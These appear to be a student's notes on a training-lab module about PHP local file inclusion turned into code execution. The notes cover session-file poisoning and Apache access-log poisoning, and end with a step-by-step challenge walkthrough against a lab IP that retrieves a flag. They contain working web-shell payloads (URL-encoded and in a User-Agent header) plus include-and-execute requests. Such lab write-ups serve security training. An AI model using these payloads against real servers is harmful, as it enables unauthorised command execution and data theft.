We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the Execute privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.

As was the case in the previous section, any of the following functions with Execute privileges should be vulnerable to these attacks:


PHP
include()/include_once()
require()/require_once()

NodeJS
res.render()

Jave
import

.NET
include

Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.


in the example As we can see, our PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd, so it should be stored at /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd. Let's try include this session file through the LFI vulnerability and view its contents: 

EXAMPLE: http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<YOUR COOKIE SESSION HERE>

We can see that the session file contains two values: page, which shows the selected language page, and preference, which shows the selected language. The preference value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the page value is under our control, as we can control it through the ?language= parameter.

Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:


URL: http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning

EXAMPLE: http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:

URL: http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

EXAMPLE: http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

Server Log Poisoning
Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.

Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.

By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.

So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get:

URL example: http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log 

We can also do this in burp by manipulating user-agent in the request tab 

Challenge: 94.237.54.190:31095 

Question 1 - Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd - /var/www/html
1) go to 94.237.54.190:31095 
2) grab cookie from dev tools - 4tv0timsfbsnudcgjjqn19eeu4 
3) http://94.237.54.190:31095/index.php?language=/var/lib/php/sessions/sess_4tv0timsfbsnudcgjjqn19eeu4
output: selected_language|s:6:"en.php";preference|s:7:"English";

4) now on NEW BROSWER TAB -> http://94.237.54.190:31095/index.php?language=poisonTest
refresh or just copy and paste previous URL of http://94.237.54.190:31095/index.php?language=/var/lib/php/sessions/sess_4tv0timsfbsnudcgjjqn19eeu4 -> you'll see the new output of: 
selected_language|s:9:"poisonTest";preference|s:7:"Spanish"; 
5) in another new tab now that we know it can be poisoned -> http:94.237.54.190:31095/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
6) nother new tab ->  http://94.237.54.190:31095/index.php?language=/var/lib/php/sessions/sess_4tv0timsfbsnudcgjjqn19eeu4&cmd=pwd
output: selected_language|s:29:"/var/www/html ";preference|s:7:"Spanish";

Question 2 - Try to use a different technique to gain RCE and read the flag at /
1) intercept a http://94.237.54.190:31095 GET request in burp
2) Send request to repeater BUT BEFORE YOU DO ANYHTING THERE !!! 
3) in the PROXY tab change the user-agent to -> <?php system($_GET['cmd']); ?> -> hit forward 
4) back to repeater, now change the GET request to -> GET /index.php?language=/var/log/apache2/access.log&cmd=ls+/ HTTP/1.1
5) after some scrolling we find -> c85ee5082f4c723ace6c0796e3a3db09.txt
6) change GET request again to -> GET /index.php?language=/var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt HTTP/1.1
7) after some scrolling we find -> HTB{1095_5#0u1d_n3v3r_63_3xp053d}
